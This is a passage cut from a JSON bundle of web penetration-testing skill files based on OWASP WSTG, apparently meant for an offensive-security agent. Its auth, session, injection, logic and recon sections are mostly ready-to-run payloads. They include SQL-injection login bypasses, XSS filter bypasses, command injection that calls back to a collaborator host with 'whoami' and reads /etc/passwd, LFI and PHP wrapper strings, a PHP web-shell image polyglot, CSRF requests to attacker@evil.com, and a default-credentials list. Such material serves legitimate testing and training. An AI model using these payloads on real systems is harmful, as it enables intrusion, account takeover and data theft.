>Event log clearing and artifact removal</td><td>T1070.001 — Clear Windows Event Logs</td></tr></tbody></table></div>","n":1161}],"m":{"name":19,"desc":309,"body":6105,"file":6610,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":30.2},"name":{"lim":64,"pct":29.7}}}},"wstg-auth-session":{"slug":"wstg-auth-session","pillar":"operators","name":"wstg-auth-session","description":"Test who the application believes you are and for how long — username enumeration, default credentials, authentication-bypass payloads, session-token entropy and cookie flags, fixation, CSRF, privilege-escalation patterns and the OAuth checklist, covering WSTG-IDNT, ATHN, AUTHZ and SESS. Token forgery routes to attack-jwt and object-level checks to attack-idor-automation.","family":"web-methodology","ported":true,"source":".cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-auth-session/SKILL.md","summary":"Test login, registration, and password reset with known vs unknown usernames:","file":"acordia-operators/skills/wstg-auth-session/SKILL.md","used_by":["mobile-application","web-application"],"intro":"<p># Auth &amp; Session Testing (WSTG-IDNT + ATHN + AUTHZ + SESS)</p>","secs":[{"t":"Username Enumeration Techniques","h":"<h4 class=\"mh\">Error Message Differentiation</h4><p>Test login, registration, and password reset with known vs unknown usernames:</p><pre class=\"code\" data-lang=bash><code># Login form — compare responses\ncurl -s -X POST https://TARGET/login -d &quot;user=admin&amp;pass=wrong&quot; -o resp_valid.txt\ncurl -s -X POST https://TARGET/login -d &quot;user=nonexistent&amp;pass=wrong&quot; -o resp_invalid.txt\ndiff resp_valid.txt resp_invalid.txt\n\n# Check response timing differences\ntime curl -s -X POST https://TARGET/login -d &quot;user=admin&amp;pass=wrong&quot; &gt; /dev/null\ntime curl -s -X POST https://TARGET/login -d &quot;user=fake12345&amp;pass=wrong&quot; &gt; /dev/null\n\n# Registration endpoint\ncurl -s -X POST https://TARGET/register -d &quot;user=admin&amp;email=test@test.com&quot;\n# Look for: &quot;username already taken&quot; vs generic error\n\n# Password reset\ncurl -s -X POST https://TARGET/forgot -d &quot;email=admin@TARGET&quot;\n# Look for: &quot;email sent&quot; vs &quot;email not found&quot;</code></pre><h4 class=\"mh\">ffuf Enumeration</h4><pre class=\"code\" data-lang=bash><code>ffuf -u https://TARGET/login -X POST -d &quot;username=FUZZ&amp;password=test&quot; \\\n  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \\\n  -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \\\n  -fr &quot;Invalid username&quot; -mc all</code></pre>","n":1113},{"t":"Default Credentials (Top 20)","h":"<div class=\"tw\"><table><thead><tr><th>Username</th><th>Password</th><th>Common On</th></tr></thead><tbody><tr><td>admin</td><td>admin</td><td>Most apps</td></tr><tr><td>admin</td><td>password</td><td>Most apps</td></tr><tr><td>admin</td><td>admin123</td><td>CMS, panels</td></tr><tr><td>administrator</td><td>administrator</td><td>Windows, Java</td></tr><tr><td>root</td><td>root</td><td>Linux, DBs</td></tr><tr><td>root</td><td>toor</td><td>Kali, some DBs</td></tr><tr><td>test</td><td>test</td><td>Dev environments</td></tr><tr><td>guest</td><td>guest</td><td>Legacy systems</td></tr><tr><td>user</td><td>user</td><td>Demo systems</td></tr><tr><td>admin</td><td>&quot;&quot; (blank)</td><td>IoT, routers</td></tr><tr><td>sa</td><td>&quot;&quot; (blank)</td><td>MSSQL</td></tr><tr><td>postgres</td><td>postgres</td><td>PostgreSQL</td></tr><tr><td>tomcat</td><td>tomcat</td><td>Apache Tomcat</td></tr><tr><td>manager</td><td>manager</td><td>Tomcat, JBoss</td></tr><tr><td>admin</td><td>changeme</td><td>Default installs</td></tr><tr><td>admin</td><td>123456</td><td>Weak defaults</td></tr><tr><td>cisco</td><td>cisco</td><td>Network devices</td></tr><tr><td>admin</td><td>secret</td><td>Various</td></tr><tr><td>operator</td><td>operator</td><td>Industrial systems</td></tr><tr><td>pi</td><td>raspberry</td><td>Raspberry Pi</td></tr></tbody></table></div>","n":1209},{"t":"Authentication Bypass Payloads","h":"<h4 class=\"mh\">SQL Injection in Login</h4><pre class=\"code\"><code>admin' --\nadmin' #\nadmin'/*\n' OR 1=1 --\n' OR 1=1 #\n' OR '1'='1\n&quot; OR &quot;1&quot;=&quot;1\nadmin' OR '1'='1\n') OR ('1'='1</code></pre><p>These are login-bypass payloads only, kept here because auth bypass is this bundle's WSTG-ATHN remit. Detection across every input, DB fingerprinting, union and blind extraction, and <code>sqlmap</code> use are owned by <code>attack-sqli</code>.</p><h4 class=\"mh\">JWT Vulnerabilities</h4><p>Decoding, <code>alg:none</code>, weak-secret cracking, RS256→HS256 key confusion, <code>kid</code> and <code>jwk</code> header injection → see <code>attack-jwt</code>.</p>","n":516},{"t":"Session Token Analysis","h":"<pre class=\"code\" data-lang=bash><code># Collect multiple session tokens\nfor i in $(seq 1 20); do\n  curl -sI https://TARGET/login | grep -i &quot;set-cookie&quot; &gt;&gt; tokens.txt\ndone\n\n# Check token entropy/randomness\n# Look for: sequential patterns, timestamps, predictable values\n\n# Cookie attributes check\ncurl -sI https://TARGET/ | grep -i &quot;set-cookie&quot;\n# Verify: Secure; HttpOnly; SameSite=Strict|Lax; Path=/; Domain=</code></pre><h4 class=\"mh\">Cookie Security Checklist</h4><div class=\"tw\"><table><thead><tr><th>Attribute</th><th>Expected</th><th>Vulnerability</th></tr></thead><tbody><tr><td>Secure</td><td>Present</td><td>Token sent over HTTP</td></tr><tr><td>HttpOnly</td><td>Present</td><td>XSS can steal cookie</td></tr><tr><td>SameSite</td><td>Strict or Lax</td><td>CSRF attacks</td></tr><tr><td>Path</td><td>Restrictive (/)</td><td>Scope too broad</td></tr><tr><td>Domain</td><td>No leading dot</td><td>Subdomain access</td></tr><tr><td>Expires/Max-Age</td><td>Reasonable timeout</td><td>Indefinite sessions</td></tr></tbody></table></div>","n":927},{"t":"Session Fixation Test","h":"<pre class=\"code\"><code>1. Note session token before login (pre-auth)\n2. Login with valid credentials\n3. Check if session token changed (post-auth)\n4. If same token → Session Fixation vulnerability</code></pre>","n":181},{"t":"CSRF Testing","h":"<pre class=\"code\" data-lang=bash><code># Check for CSRF tokens\ncurl -s https://TARGET/form-page | grep -i &quot;csrf\\|token\\|_token&quot;\n\n# Test without CSRF token\ncurl -X POST https://TARGET/change-email \\\n  -H &quot;Cookie: session=USER_SESSION&quot; \\\n  -d &quot;email=attacker@evil.com&quot;\n\n# Test with wrong CSRF token\ncurl -X POST https://TARGET/change-email \\\n  -H &quot;Cookie: session=USER_SESSION&quot; \\\n  -d &quot;email=attacker@evil.com&amp;csrf_token=invalid&quot;</code></pre>","n":400},{"t":"IDOR Testing Patterns","h":"<p>Sequential-ID enumeration, UUID swap, parameter-based references and HTTP method switching → see <code>attack-idor-automation</code>.</p>","n":122},{"t":"Privilege Escalation Patterns","h":"<pre class=\"code\" data-lang=bash><code># Horizontal: access another user's data\n# Swap session cookie / JWT between users\n# Change user ID in request body or URL\n\n# Vertical: escalate to admin\ncurl -X POST https://TARGET/api/update-profile \\\n  -H &quot;Cookie: session=REGULAR_USER&quot; \\\n  -d '{&quot;name&quot;:&quot;test&quot;,&quot;role&quot;:&quot;admin&quot;}'\n\n# Add admin parameters\ncurl -X POST https://TARGET/register \\\n  -d &quot;username=test&amp;password=test&amp;isAdmin=true&quot;\n\n# Access admin endpoints with regular session\ncurl -s -H &quot;Cookie: session=REGULAR_USER&quot; https://TARGET/admin/dashboard\ncurl -s -H &quot;Cookie: session=REGULAR_USER&quot; https://TARGET/api/admin/users</code></pre>","n":594},{"t":"OAuth Testing Checklist","h":"<pre class=\"code\"><code>1. Redirect URI manipulation:\n   - redirect_uri=https://evil.com\n   - redirect_uri=https://TARGET.evil.com\n   - redirect_uri=https://TARGET/callback/../evil\n   - redirect_uri=https://TARGET/callback?next=https://evil.com\n\n2. State parameter:\n   - Remove state parameter entirely\n   - Reuse old state value\n   - Use empty string\n\n3. PKCE bypass:\n   - Omit code_verifier in token request\n   - Use plain instead of S256\n\n4. Token leakage:\n   - Check access token in URL fragment\n   - Check referrer header leaks token\n   - Check browser history</code></pre><p>For detailed procedures on any test, read: <code>knowledge/web-application/WSTG-IDNT/WSTG-IDNT-{NN}.md</code> <code>knowledge/web-application/WSTG-ATHN/WSTG-ATHN-{NN}.md</code> <code>knowledge/web-application/WSTG-AUTHZ/WSTG-AUTHZ-{NN}.md</code> <code>knowledge/web-application/WSTG-SESS/WSTG-SESS-{NN}.md</code></p>","n":819}],"m":{"name":17,"desc":374,"body":6220,"file":6804,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":36.5},"name":{"lim":64,"pct":26.6}}}},"wstg-injection":{"slug":"wstg-injection","pillar":"operators","name":"wstg-injection","description":"Sweep every input a web target accepts for injection, covering WSTG-INPV — cross-site scripting by rendering context with filter bypasses, OS command injection, LFI and path traversal, HTTP parameter pollution and mass assignment carried in full, while SQLi, SSTI, SSRF, XXE and Host-header work route to their dedicated attack skills. Reach for it to decide which injection class a parameter belongs to.","family":"web-methodology","ported":true,"source":".cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-injection/SKILL.md","summary":"SQL injection → see `attack-sqli`.","file":"acordia-operators/skills/wstg-injection/SKILL.md","used_by":["web-application"],"intro":"<p># Input Validation &amp; Injection Testing (WSTG-INPV)</p>","secs":[{"t":"SQL Injection","h":"<p>SQL injection → see <code>attack-sqli</code>.</p>","n":34},{"t":"Cross-Site Scripting (XSS)","h":"<h4 class=\"mh\">Reflected XSS Payloads</h4><pre class=\"code\" data-lang=html><code>&lt;script&gt;\n  alert(1)\n&lt;/script&gt;\n&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot; /&gt;\n&lt;svg onload=&quot;alert(1)&quot;&gt;\n  &lt;body onload=&quot;alert(1)&quot;&gt;\n    &lt;input onfocus=&quot;alert(1)&quot; autofocus&gt;\n      &lt;details open ontoggle=&quot;alert(1)&quot;&gt;\n        &lt;marquee onstart=&quot;alert(1)&quot;&gt;javascript:alert(1)&lt;/marquee&gt;\n      &lt;/details&gt;\n    &lt;/input&gt;\n  &lt;/body&gt;\n&lt;/svg&gt;</code></pre><h4 class=\"mh\">Context-Specific Payloads</h4><pre class=\"code\" data-lang=html><code>&lt;!-- Inside HTML attribute (break out) --&gt;\n&quot; onmouseover=&quot;alert(1)\n' onfocus='alert(1)' autofocus='\n\n&lt;!-- Inside script tag --&gt;\n';alert(1);//\n&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n\n&lt;!-- Inside JavaScript string --&gt;\n\\';alert(1);//\n\\&quot;-alert(1)-\\&quot;\n\n&lt;!-- Inside URL/href --&gt;\njavascript:alert(1)\ndata:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\n\n&lt;!-- Inside CSS --&gt;\nexpression(alert(1))\nurl('javascript:alert(1)')</code></pre><h4 class=\"mh\">Filter Bypass Techniques</h4><pre class=\"code\" data-lang=html><code>&lt;!-- Case variation --&gt;\n&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;\n&lt;IMG SRC=x OnErRoR=alert(1)&gt;\n\n&lt;!-- Encoding --&gt;\n&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;\n&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;\n%3Cscript%3Ealert(1)%3C/script%3E\n\n&lt;!-- No parentheses --&gt;\n&lt;img src=x onerror=alert`1`&gt;\n&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;\n\n&lt;!-- No quotes/angle brackets --&gt;\n&lt;svg/onload=alert(1)&gt;\n&lt;img src=x onerror=alert(1)//&gt;\n\n&lt;!-- Double encoding --&gt;\n%253Cscript%253Ealert(1)%253C/script%253E</code></pre><h4 class=\"mh\">Stored XSS Targets</h4><p>Test payload injection in: profile name/bio, comments, messages, forum posts, file names, email subjects, metadata fields, custom headers.</p>","n":1467},{"t":"Command Injection","h":"<h4 class=\"mh\">OS-Specific Payloads</h4><pre class=\"code\" data-lang=bash><code># Linux\n; id\n| id\n|| id\n$(id)\n`id`\n; cat /etc/passwd\n| whoami\n&amp; ping -c 1 COLLAB_SERVER &amp;\n\n# Windows\n&amp; ipconfig\n| net user\n; dir C:\\\n&amp; ping -n 1 COLLAB_SERVER &amp;\n\n# Blind detection (use collaborator/webhook)\n; curl http://COLLAB_SERVER/$(whoami)\n| nslookup COLLAB_SERVER\n; ping -c 1 COLLAB_SERVER</code></pre><h4 class=\"mh\">Bypasses</h4><pre class=\"code\" data-lang=bash><code># Space bypass\n;{id}\n;$IFS'id'\ncat$IFS/etc/passwd\ncat${IFS}/etc/passwd\nX=$'cat\\x20/etc/passwd'&amp;&amp;$X\n\n# Blacklist bypass\n/bin/c?t /etc/p?sswd\nc''a''t /etc/passwd\nc\\at /etc/passwd</code></pre>","n":537},{"t":"Server-Side Template Injection (SSTI)","h":"<p>Server-side template injection → see <code>attack-ssti</code>.</p>","n":51},{"t":"Server-Side Request Forgery (SSRF)","h":"<p>Server-side request forgery → see <code>attack-ssrf</code>.</p>","n":48},{"t":"XML External Entity (XXE)","h":"<p>XML external entity injection → see <code>attack-xxe</code>.</p>","n":49},{"t":"LFI / Path Traversal","h":"<pre class=\"code\" data-lang=bash><code># Basic traversal\n../../../etc/passwd\n..%2f..%2f..%2fetc/passwd\n....//....//....//etc/passwd\n..%252f..%252f..%252fetc/passwd\n\n# Windows\n..\\..\\..\\windows\\win.ini\n..%5c..%5c..%5cwindows\\win.ini\n\n# Null byte (older PHP)\n../../../etc/passwd%00\n../../../etc/passwd%00.jpg\n\n# Wrapper (PHP)\nphp://filter/convert.base64-encode/resource=index.php\nphp://input (POST body = PHP code)\nexpect://id\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==</code></pre>","n":454},{"t":"Host Header Injection","h":"<p>Host header injection → see <code>attack-host-header</code>.</p>","n":49},{"t":"HTTP Parameter Pollution","h":"<pre class=\"code\" data-lang=bash><code># Duplicate parameters\nhttps://TARGET/page?id=1&amp;id=2\n\n# Server behavior varies:\n# PHP/Apache: last value (id=2)\n# ASP.NET/IIS: both (id=1,2)\n# JSP/Tomcat: first value (id=1)</code></pre>","n":185},{"t":"Mass Assignment","h":"<pre class=\"code\" data-lang=bash><code># Add extra fields to updates\ncurl -X PUT https://TARGET/api/profile \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -H &quot;Cookie: session=USER_SESSION&quot; \\\n  -d '{&quot;name&quot;:&quot;test&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;isAdmin&quot;:true,&quot;verified&quot;:true}'\n\n# Common fields to try:\n# role, admin, isAdmin, is_admin, verified, active, permissions\n# price, discount, balance, credits\n# user_id, account_id, org_id</code></pre><p>For detailed procedures on any test, read: <code>knowledge/web-application/WSTG-INPV/WSTG-INPV-{NN}.md</code></p>","n":484}],"m":{"name":14,"desc":404,"body":3711,"file":4319,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":39.5},"name":{"lim":64,"pct":21.9}}}},"wstg-logic-client-api":{"slug":"wstg-logic-client-api","pillar":"operators","name":"wstg-logic-client-api","description":"Test what a web application permits rather than what it parses — price, currency and workflow manipulation, coupon and file-upload abuse, DOM XSS sources and sinks, postMessage, clickjacking, browser storage, REST enumeration and API mass assignment, covering WSTG-BUSL, CLNT and APIT. CORS, GraphQL, WebSocket and throttling work route to their dedicated attack skills.","family":"web-methodology","ported":true,"source":".cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-logic-client-api/SKILL.md","summary":"```bash","file":"acordia-operators/skills/wstg-logic-client-api/SKILL.md","used_by":["mobile-application","web-application"],"intro":"<p># Business Logic, Client-Side &amp; API Testing (WSTG-BUSL + CLNT + APIT)</p>","secs":[{"t":"Business Logic Testing","h":"<h4 class=\"mh\">Price &amp; Payment Manipulation</h4><pre class=\"code\" data-lang=bash><code># Negative quantity/price\ncurl -X POST https://TARGET/api/cart -d '{&quot;item_id&quot;:1,&quot;quantity&quot;:-1,&quot;price&quot;:100}'\n\n# Zero/fractional values\ncurl -X POST https://TARGET/api/cart -d '{&quot;item_id&quot;:1,&quot;quantity&quot;:0.001}'\n\n# Modify price client-side\ncurl -X POST https://TARGET/api/checkout -d '{&quot;item_id&quot;:1,&quot;price&quot;:0.01}'\n\n# Currency confusion\ncurl -X POST https://TARGET/api/checkout -d '{&quot;amount&quot;:100,&quot;currency&quot;:&quot;JPY&quot;}'\n# (JPY has no decimals; mishandled conversion)\n\n# Discount/coupon abuse\ncurl -X POST https://TARGET/api/apply-coupon -d '{&quot;code&quot;:&quot;SAVE50&quot;,&quot;code&quot;:&quot;SAVE50&quot;}'\n# Test: apply multiple times, expired codes, codes from other users</code></pre><h4 class=\"mh\">Workflow Bypass</h4><pre class=\"code\" data-lang=bash><code># Skip steps in multi-step process\n# Step 1: /checkout/address → Step 2: /checkout/payment → Step 3: /checkout/confirm\n# Try accessing Step 3 directly:\ncurl -s -H &quot;Cookie: session=TOKEN&quot; https://TARGET/checkout/confirm\n\n# Modify step indicator\ncurl -X POST https://TARGET/checkout -d '{&quot;step&quot;:3,&quot;complete&quot;:true}'\n\n# Process flow reversal\n# Complete payment → go back → change cart → order ships with old payment</code></pre><h4 class=\"mh\">Rate Limiting &amp; Function Abuse</h4><p>Throttling limits and their bypasses → see <code>attack-rate-limit-bypass</code>. Concurrent abuse of a one-shot action — duplicate redemption, double-spend → see <code>attack-race-condition</code>.</p><h4 class=\"mh\">File Upload Abuse</h4><pre class=\"code\" data-lang=bash><code># Extension bypass\n# file.php → file.php.jpg, file.pHp, file.php%00.jpg, file.php;.jpg\n# Double extension: file.jpg.php, file.php.png\n\n# Content-type bypass\ncurl -X POST https://TARGET/upload \\\n  -F &quot;file=@shell.php;type=image/jpeg&quot;\n\n# Polyglot files (valid image + valid PHP)\n# Create with: exiftool -Comment='&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' image.jpg\n# Rename to image.php.jpg\n\n# Oversized file (DoS)\ndd if=/dev/urandom of=bigfile.bin bs=1M count=100\ncurl -X POST https://TARGET/upload -F &quot;file=@bigfile.bin&quot;\n\n# SVG with XSS\n# &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(1)&quot;/&gt;\n\n# XXE via DOCX (unzip, inject XXE in [Content_Types].xml)</code></pre>","n":2021},{"t":"Client-Side Testing","h":"<h4 class=\"mh\">DOM XSS Sources &amp; Sinks</h4><p><strong>Sources (attacker-controlled input):</strong></p><pre class=\"code\" data-lang=javascript><code>document.URL\ndocument.location\ndocument.referrer\nwindow.location.hash\nwindow.location.search\nwindow.name\npostMessage data\nlocalStorage / sessionStorage</code></pre><p><strong>Sinks (dangerous execution points):</strong></p><pre class=\"code\" data-lang=javascript><code>// High risk\neval()\ndocument.write()\ndocument.writeln()\ninnerHTML\nouterHTML\ninsertAdjacentHTML()\nelement.setAttribute(&quot;onclick&quot;, ...)\nsetTimeout(string, ...)\nsetInterval(string, ...)\nnew Function(string)\n$.html()  // jQuery\n\n// Medium risk\nwindow.location = ...\nwindow.location.href = ...\ndocument.cookie = ...\nelement.src = ...</code></pre><h4 class=\"mh\">DOM XSS Testing</h4><pre class=\"code\" data-lang=javascript><code>// Check for vulnerable patterns in JS\n// In browser console:\n// Search for sources flowing to sinks\n\n// Test via URL fragment (not sent to server)\nhttps://TARGET/page#&lt;img src=x onerror=alert(1)&gt;\nhttps://TARGET/page#javascript:alert(1)\n\n// Test via query params reflected in DOM\nhttps://TARGET/page?q=&lt;script&gt;alert(1)&lt;/script&gt;\nhttps://TARGET/search?term=test&quot; onmouseover=&quot;alert(1)</code></pre><h4 class=\"mh\">postMessage Vulnerabilities</h4><pre class=\"code\" data-lang=javascript><code>// Check for listeners without origin validation\n// In browser console:\n// Look for: window.addEventListener(&quot;message&quot;, ...)\n// Vulnerable if no event.origin check\n\n// Test: open target in iframe, send malicious message\n// &lt;iframe src=&quot;https://TARGET&quot; id=&quot;target&quot;&gt;&lt;/iframe&gt;\n// document.getElementById('target').contentWindow.postMessage('payload','*');</code></pre><h4 class=\"mh\">Clickjacking Test</h4><pre class=\"code\" data-lang=bash><code># Check headers\ncurl -sI https://TARGET | grep -i &quot;x-frame-options\\|content-security-policy&quot;\n\n# Missing X-Frame-Options AND no frame-ancestors in CSP = vulnerable\n# Create PoC:\n# &lt;iframe src=&quot;https://TARGET/sensitive-action&quot; style=&quot;opacity:0.1&quot; width=&quot;500&quot; height=&quot;500&quot;&gt;&lt;/iframe&gt;\n# &lt;button style=&quot;position:absolute;top:X;left:Y&quot;&gt;Click me!&lt;/button&gt;</code></pre><h4 class=\"mh\">Browser Storage Audit</h4><pre class=\"code\" data-lang=javascript><code>// In browser console, check for sensitive data:\n// localStorage\nfor (let i = 0; i &lt; localStorage.length; i++) {\n  let key = localStorage.key(i)\n  console.log(key + &quot;: &quot; + localStorage.getItem(key))\n}\n// sessionStorage\nfor (let i = 0; i &lt; sessionStorage.length; i++) {\n  let key = sessionStorage.key(i)\n  console.log(key + &quot;: &quot; + sessionStorage.getItem(key))\n}\n// Look for: tokens, passwords, PII, API keys</code></pre>","n":2294},{"t":"CORS Misconfiguration Testing","h":"<p>Origin reflection, <code>null</code> origin, subdomain, prefix and suffix match bypasses, and the wildcard-with-credentials case → see <code>attack-cors</code>.</p>","n":138},{"t":"API Security Testing","h":"<h4 class=\"mh\">REST API Enumeration</h4><pre class=\"code\" data-lang=bash><code># Common API documentation paths\ncurl -s https://TARGET/swagger.json\ncurl -s https://TARGET/openapi.json\ncurl -s https://TARGET/api-docs\ncurl -s https://TARGET/swagger/v1/swagger.json\ncurl -s https://TARGET/v1/api-docs\ncurl -s https://TARGET/.well-known/openapi.json\n\n# Method enumeration on endpoints\nfor method in GET POST PUT PATCH DELETE OPTIONS HEAD; do\n  echo -n &quot;$method: &quot;\n  curl -s -o /dev/null -w &quot;%{http_code}&quot; -X $method https://TARGET/api/endpoint\n  echo\ndone\n\n# Version testing\ncurl -s https://TARGET/api/v1/users\ncurl -s https://TARGET/api/v2/users\ncurl -s -H &quot;Accept: application/vnd.api.v1+json&quot; https://TARGET/api/users</code></pre><h4 class=\"mh\">GraphQL Testing</h4><p>Introspection, schema extraction, batch and deep-nesting DoS, authorization bypass and endpoint discovery → see <code>attack-graphql</code>.</p><h4 class=\"mh\">WebSocket Testing</h4><p>Origin validation and CSWSH, post-upgrade authentication, message injection and cleartext transport → see <code>attack-websocket</code>.</p><h4 class=\"mh\">Mass Assignment in APIs</h4><pre class=\"code\" data-lang=bash><code># Find writable fields by comparing GET response with PUT/PATCH\nGET_RESPONSE=$(curl -s https://TARGET/api/profile -H &quot;Cookie: session=TOKEN&quot;)\necho $GET_RESPONSE | jq .\n# Take all fields from response, add admin fields, send back:\ncurl -X PUT https://TARGET/api/profile \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -H &quot;Cookie: session=TOKEN&quot; \\\n  -d '{&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;isVerified&quot;:true}'</code></pre><p>For detailed procedures on any test, read: <code>knowledge/web-application/WSTG-BUSL/WSTG-BUSL-{NN}.md</code> <code>knowledge/web-application/WSTG-CLNT/WSTG-CLNT-{NN}.md</code> <code>knowledge/web-application/WSTG-APIT/WSTG-APIT-{NN}.md</code></p>","n":1653}],"m":{"name":21,"desc":370,"body":6294,"file":6882,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":36.1},"name":{"lim":64,"pct":32.8}}}},"wstg-recon-config":{"slug":"wstg-recon-config","pillar":"operators","name":"wstg-recon-config","description":"Audit a web target's deployment rather than its code — Google dorks, directory, file and virtual-host discovery, backup-file patterns, the security-header checklist, TLS and SSL posture, dangerous HTTP methods, error verbosity and exposed cloud storage, covering WSTG-INFO, CONF, ERRH and CRYP. Claiming a dangling name routes to attack-subdomain-takeover.","family":"web-methodology","ported":true,"source":".cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-recon-config/SKILL.md","summary":"Replace `TARGET` with the actual domain:","file":"acordia-operators/skills/wstg-recon-config/SKILL.md","used_by":["web-application"],"intro":"<p># Recon &amp; Configuration Testing (WSTG-INFO + CONF + ERRH + CRYP)</p>","secs":[{"t":"Google Dork Templates","h":"<p>Replace <code>TARGET</code> with the actual domain:</p><pre class=\"code\"><code>site:TARGET filetype:pdf | filetype:doc | filetype:xls\nsite:TARGET inurl:admin | inurl:login | inurl:dashboard\nsite:TARGET ext:php inurl:?\nsite:TARGET intitle:&quot;index of&quot;\nsite:TARGET inurl:wp-content | inurl:wp-includes\nsite:TARGET ext:log | ext:cfg | ext:env | ext:ini | ext:bak\nsite:TARGET &quot;error&quot; | &quot;warning&quot; | &quot;fatal&quot; | &quot;exception&quot;\ninurl:&quot;q=&quot; site:TARGET\n&quot;TARGET&quot; site:pastebin.com | site:github.com | site:trello.com</code></pre>","n":470},{"t":"Directory & File Discovery","h":"<h4 class=\"mh\">ffuf Commands</h4><pre class=\"code\" data-lang=bash><code># Directory brute force\nffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -ac\n\n# File discovery\nffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,301,302 -ac\n\n# Extension fuzzing\nffuf -u https://TARGET/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -mc 200\n\n# Virtual host discovery\nffuf -u https://TARGET -H &quot;Host: FUZZ.TARGET&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac\n\n# Parameter discovery\nffuf -u &quot;https://TARGET/page?FUZZ=test&quot; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -ac</code></pre><h4 class=\"mh\">Backup File Patterns</h4><p>Test for these at discovered paths:</p><pre class=\"code\"><code>.bak, .old, .orig, .save, .swp, .swo, ~\n.git/, .svn/, .hg/, .env, .DS_Store\nconfig.php.bak, web.config.old, .htaccess.bak\nwp-config.php.bak, database.yml.old\nCopy of *, backup-*, archive-*</code></pre>","n":989},{"t":"Security Header Checklist","h":"<p>Check with <code>curl -I https://TARGET</code>:</p><div class=\"tw\"><table><thead><tr><th>Header</th><th>Expected Value</th><th>Risk if Missing</th></tr></thead><tbody><tr><td>Strict-Transport-Security</td><td><code>max-age=31536000; includeSubDomains</code></td><td>MITM, SSL stripping</td></tr><tr><td>Content-Security-Policy</td><td>No <code>unsafe-inline</code>, no <code>unsafe-eval</code></td><td>XSS</td></tr><tr><td>X-Content-Type-Options</td><td><code>nosniff</code></td><td>MIME sniffing</td></tr><tr><td>X-Frame-Options</td><td><code>DENY</code> or <code>SAMEORIGIN</code></td><td>Clickjacking</td></tr><tr><td>Referrer-Policy</td><td><code>strict-origin-when-cross-origin</code></td><td>Info leakage</td></tr><tr><td>Permissions-Policy</td><td>Restrict camera, microphone, geolocation</td><td>Feature abuse</td></tr><tr><td>X-XSS-Protection</td><td><code>0</code> (deprecated, CSP preferred)</td><td>N/A</td></tr><tr><td>Cache-Control</td><td><code>no-store</code> on sensitive pages</td><td>Cached credentials</td></tr></tbody></table></div>","n":989},{"t":"TLS/SSL Testing","h":"<pre class=\"code\" data-lang=bash><code># testssl.sh (comprehensive)\ntestssl.sh --severity HIGH https://TARGET\n\n# sslscan (quick)\nsslscan --no-failed TARGET:443\n\n# Check specific issues\n# SSLv2/SSLv3 support\nopenssl s_client -connect TARGET:443 -ssl3 2&gt;&amp;1 | grep -i &quot;alert&quot;\n\n# Certificate details\nopenssl s_client -connect TARGET:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -text -noout\n\n# Check for HSTS preload\ncurl -sI https://TARGET | grep -i strict-transport</code></pre><p><strong>TLS Issues to Check:</strong></p><ul class=\"ml\"><li>SSLv3, TLS 1.0, TLS 1.1 supported (should be disabled)</li><li>Weak ciphers (RC4, DES, 3DES, NULL, EXPORT)</li><li>Missing Perfect Forward Secrecy (PFS)</li><li>Certificate: expired, self-signed, wrong CN/SAN, weak signature (SHA1)</li><li>BEAST, POODLE, Heartbleed, CRIME, BREACH, ROBOT</li></ul>","n":726},{"t":"HTTP Methods Testing","h":"<pre class=\"code\" data-lang=bash><code># Check allowed methods\ncurl -X OPTIONS https://TARGET/ -I\n\n# Test dangerous methods\ncurl -X TRACE https://TARGET/ -I\ncurl -X PUT https://TARGET/test.txt -d &quot;test&quot; -I\ncurl -X DELETE https://TARGET/test.txt -I\n\n# Method override headers\ncurl -X POST https://TARGET/admin -H &quot;X-HTTP-Method-Override: PUT&quot;\ncurl -X POST https://TARGET/admin -H &quot;X-Method-Override: DELETE&quot;</code></pre>","n":379},{"t":"Error Triggering Payloads","h":"<p>Force errors to check for information disclosure:</p><pre class=\"code\" data-lang=bash><code># Non-existent pages\ncurl -s https://TARGET/nonexistent-page-12345\n\n# Invalid parameters\ncurl -s &quot;https://TARGET/page?id='&quot;\ncurl -s &quot;https://TARGET/page?id=-1&quot;\ncurl -s &quot;https://TARGET/page?id=99999999&quot;\n\n# Large input\ncurl -s &quot;https://TARGET/page?id=$(python3 -c 'print(&quot;A&quot;*10000)')&quot;\n\n# Special characters\ncurl -s &quot;https://TARGET/page?id=%00%0a%0d&quot;\n\n# Content-type mismatch\ncurl -s -X POST https://TARGET/api/endpoint -H &quot;Content-Type: application/xml&quot; -d &quot;&lt;test&gt;&quot;</code></pre><p><strong>Look for in error responses:</strong> stack traces, file paths, database names, framework versions, SQL error messages, internal IP addresses.</p>","n":665},{"t":"Subdomain & Cloud Storage","h":"<pre class=\"code\" data-lang=bash><code># Subdomain enumeration\nsubfinder -d TARGET -silent | tee 